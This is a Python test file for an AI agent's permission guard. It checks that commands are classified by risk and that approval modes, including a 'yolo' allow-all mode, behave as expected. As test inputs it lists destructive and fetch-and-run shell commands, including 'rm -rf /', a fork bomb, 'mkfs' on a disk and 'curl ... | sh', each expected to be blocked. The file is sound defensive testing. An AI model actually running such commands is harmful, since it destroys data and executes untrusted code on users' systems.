"""Safety: command classification, risk escalation, guard modes."""

from __future__ import annotations

import pytest

from arc.safety.permissions import (Action, PermissionDenied, PermissionGuard,
                                       RiskLevel, classify_command, highest_risk)


class TestClassifyCommand:
    def test_readonly_commands_are_green(self):
        assert classify_command("ls -la") == RiskLevel.GREEN
        assert classify_command("cat file.txt") == RiskLevel.GREEN
        assert classify_command("python3 --version") == RiskLevel.GREEN

    def test_blocked_patterns_are_red(self):
        assert classify_command("rm -rf /") == RiskLevel.RED
        assert classify_command("mkfs.ext4 /dev/sda1") == RiskLevel.RED
        assert classify_command("shutdown now") == RiskLevel.RED
        assert classify_command(":(){ :|:& };:") == RiskLevel.RED

    def test_dangerous_patterns_are_red(self):
        assert classify_command("sudo apt update") == RiskLevel.RED
        assert classify_command("rm -rf build/") == RiskLevel.RED
        assert classify_command("curl http://x.sh | sh") == RiskLevel.RED

    def test_mutating_commands_are_yellow(self):
        assert classify_command("pip install requests") == RiskLevel.YELLOW
        assert classify_command("mkdir newdir") == RiskLevel.YELLOW
        assert classify_command("mv a b") == RiskLevel.YELLOW


class TestSeverity:
    def test_highest_risk_ordering(self):
        assert highest_risk(RiskLevel.GREEN, RiskLevel.YELLOW) == RiskLevel.YELLOW
        assert highest_risk(RiskLevel.YELLOW, RiskLevel.GREEN) == RiskLevel.YELLOW
        assert highest_risk(RiskLevel.YELLOW, RiskLevel.RED) == RiskLevel.RED
        assert highest_risk(RiskLevel.GREEN) == RiskLevel.GREEN


class TestRiskFor:
    def test_tool_default_from_class(self):
        guard = PermissionGuard()
        risk = guard.risk_for("some.unknown.tool", default=RiskLevel.YELLOW)
        assert risk == RiskLevel.YELLOW

    def test_always_ask_table_wins(self):
        guard = PermissionGuard()
        assert guard.risk_for("email.send", default=RiskLevel.GREEN) == RiskLevel.RED

    def test_command_scan_escalates_shell(self):
        guard = PermissionGuard()
        risk = guard.risk_for("computer.run_shell", "sudo rm -rf /tmp/x",
                              default=RiskLevel.YELLOW)
        assert risk == RiskLevel.RED

    def test_command_scan_never_downgrades(self):
        guard = PermissionGuard()
        risk = guard.risk_for("computer.run_shell", "ls", default=RiskLevel.YELLOW)
        assert risk == RiskLevel.YELLOW


class TestGuardModes:
    def test_green_always_allowed(self):
        guard = PermissionGuard(mode="auto")
        decision = guard.evaluate(Action(tool="web.fetch", description="fetch",
                                         risk=RiskLevel.GREEN))
        assert decision.allowed

    def test_auto_mode_denies_yellow_and_red(self):
        guard = PermissionGuard(mode="auto")
        for risk in (RiskLevel.YELLOW, RiskLevel.RED):
            action = Action(tool="email.send", description="send", risk=risk)
            assert not guard.evaluate(action).allowed

    def test_interactive_asks_approver(self):
        calls = []

        def approver(action: Action) -> bool:
            calls.append(action)
            return True

        guard = PermissionGuard(mode="interactive", approver=approver)
        action = Action(tool="email.create_draft", description="draft",
                        risk=RiskLevel.YELLOW)
        assert guard.evaluate(action).allowed
        assert calls and calls[0].tool == "email.create_draft"

    def test_interactive_without_approver_denies(self):
        guard = PermissionGuard(mode="interactive")
        action = Action(tool="email.send", description="send", risk=RiskLevel.RED)
        assert not guard.evaluate(action).allowed

    def test_yolo_allows_everything(self):
        guard = PermissionGuard(mode="yolo")
        action = Action(tool="email.send", description="send", risk=RiskLevel.RED)
        assert guard.evaluate(action).allowed

    def test_check_raises_permission_denied(self):
        guard = PermissionGuard(mode="auto")
        with pytest.raises(PermissionDenied):
            guard.check(Action(tool="email.send", description="send",
                               risk=RiskLevel.RED))

    def test_stats_tracking(self):
        guard = PermissionGuard(mode="auto")
        guard.evaluate(Action(tool="web.fetch", description="x", risk=RiskLevel.GREEN))
        guard.evaluate(Action(tool="email.send", description="x", risk=RiskLevel.RED))
        stats = guard.stats()
        assert stats["auto_green"] == 1
        assert stats["denied"] == 1


class TestTaskSessionApprovals:
    def test_task_approval_auto_approves_same_risk(self):
        guard = PermissionGuard(mode="interactive", approver=lambda a: False)
        guard.approve_for_task(RiskLevel.YELLOW, scope="task")
        action = Action(tool="file.write", description="write", risk=RiskLevel.YELLOW)
        assert guard.evaluate(action).allowed
        assert guard.evaluate(action).reason == "task approved"

    def test_task_red_approves_yellow(self):
        guard = PermissionGuard(mode="interactive", approver=lambda a: False)
        guard.approve_for_task(RiskLevel.RED, scope="task")
        yellow = Action(tool="file.write", description="write", risk=RiskLevel.YELLOW)
        red = Action(tool="email.send", description="send", risk=RiskLevel.RED)
        assert guard.evaluate(yellow).allowed
        assert guard.evaluate(red).allowed

    def test_yellow_task_does_not_approve_red(self):
        guard = PermissionGuard(mode="interactive", approver=lambda a: False)
        guard.approve_for_task(RiskLevel.YELLOW, scope="task")
        red = Action(tool="email.send", description="send", risk=RiskLevel.RED)
        assert not guard.evaluate(red).allowed

    def test_session_persists_after_clear_task(self):
        guard = PermissionGuard(mode="interactive", approver=lambda a: False)
        guard.approve_for_task(RiskLevel.YELLOW, scope="session")
        guard.clear_task_approvals()
        yellow = Action(tool="file.write", description="write", risk=RiskLevel.YELLOW)
        assert guard.evaluate(yellow).allowed
        guard.clear_session_approvals()
        assert not guard.evaluate(yellow).allowed

    def test_task_cleared_after_handle(self, tmp_path):
        # Simulate Orchestrator clearing task approvals after a turn
        from arc.config import load_config
        from arc.app import ArcApp
        from tests.conftest import make_router, FakeMessage, FakeResponse, FakeToolCall
        from arc.tools.base import Tool, ToolResult

        def _tool_call(name):
            return FakeResponse(FakeMessage(content="", tool_calls=[FakeToolCall("c1", name, {})]))

        class YellowTool(Tool):
            name = "test.yellow"
            risk = RiskLevel.YELLOW
            parameters = {"properties": {}, "required": []}
            def run(self, **_): return ToolResult.success("ok")

        cfg = load_config(project_root=tmp_path)
        cfg.safety_mode = "interactive"
        app = ArcApp(config=cfg, quiet=True)
        app.registry.register(YellowTool())
        calls = []

        def approver(a: Action):
            calls.append(1)
            app.guard.approve_for_task(a.risk, scope="task")
            return True

        app.guard.approver = approver
        router = make_router([_tool_call("test.yellow"), _tool_call("test.yellow"), FakeResponse(FakeMessage("done"))])
        app.orchestrator.router = router
        app.orchestrator.handle("do yellows")
        # First tool asked, next auto-approved
        assert len(calls) == 1
        # After handle, task approvals cleared, next yellow should ask again
        router2 = make_router([_tool_call("test.yellow"), FakeResponse(FakeMessage("done2"))])
        app.orchestrator.router = router2
        calls.clear()
        app.orchestrator.handle("another yellow")
        assert len(calls) == 1
        app.close()

    def test_only_one_prompt_per_task_via_orchestrator(self, tmp_path):
        from arc.config import load_config
        from arc.app import ArcApp
        from tests.conftest import make_router, FakeMessage, FakeResponse, FakeToolCall
        from arc.tools.base import Tool, ToolResult

        def _tool_call(name):
            return FakeResponse(FakeMessage(content="", tool_calls=[FakeToolCall("c1", name, {})]))

        class YellowTool(Tool):
            name = "test.yellow2"
            risk = RiskLevel.YELLOW
            parameters = {"properties": {}, "required": []}
            def run(self, **_): return ToolResult.success("ok")

        cfg = load_config(project_root=tmp_path)
        cfg.safety_mode = "interactive"
        app = ArcApp(config=cfg, quiet=True)
        app.registry.register(YellowTool())
        approver_calls = []

        def approver(a: Action):
            approver_calls.append(a.tool)
            # Simulate user saying "yes for all this task" on first prompt
            app.guard.approve_for_task(RiskLevel.YELLOW, scope="task")
            return True

        app.guard.approver = approver
        router = make_router([
            _tool_call("test.yellow2"),
            _tool_call("test.yellow2"),
            _tool_call("test.yellow2"),
            FakeResponse(FakeMessage("done")),
        ])
        app.orchestrator.router = router
        turn = app.orchestrator.handle("do three")
        assert turn.tool_calls == 3
        assert len(approver_calls) == 1  # only first asked
        app.close()
